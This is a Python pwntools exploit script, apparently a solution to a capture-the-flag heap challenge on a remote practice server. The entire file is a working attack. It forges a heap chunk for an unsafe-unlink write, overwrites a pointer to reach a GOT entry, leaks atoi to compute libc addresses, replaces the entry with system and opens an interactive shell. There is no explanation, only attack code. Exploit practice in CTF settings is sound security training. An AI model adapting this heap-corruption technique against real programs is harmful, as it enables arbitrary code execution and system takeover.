#!/usr/bin/env python
from pwn import *

r = remote("csie.ctf.tw",10138)

def ad(size,name):
        r.recvuntil(":")
        r.sendline("2")
	r.recvuntil(":")
        r.sendline(str(size))
        r.recvuntil(":")
        r.sendline(name)

def show():
        r.recvuntil(":")
        r.sendline("1")

def change(index,size,name):
        r.recvuntil(":")
        r.sendline("3")
        r.recvuntil(":")
        r.sendline(str(index))
        r.recvuntil(":")
        r.sendline(str(size))
        r.recvuntil(":")
        r.sendline(name)

def rm(index):
        r.recvuntil(":")
        r.sendline("4")
        r.recvuntil(":")
        r.sendline(str(index))

rw = 0x6020c8
ad(0x40,"ddaa")  #0
ad(0x80,"ddaa")  #1
ad(0x40,"ddaa")
fake = p64(0)+p64(0x41)
fake += p64(rw-0x18)+p64(rw-0x10)
fake += "a"*0x20
fake += p64(0x40)+p64(0x90)
change(0,0x80,fake)
rm(1)
payload = p64(0)*2
payload += p64(0x40)+p64(0x602068)
change(0,0x80,payload)
show()
r.recvuntil("0 : ")
atoi = u64(r.recvuntil(":")[:6].ljust(8,"\x00"))
libc = atoi - 0x36e80
system = libc + 0x45390
change(0,0x8,p64(system))
ad(0x40,"ddaa")
r.interactive()
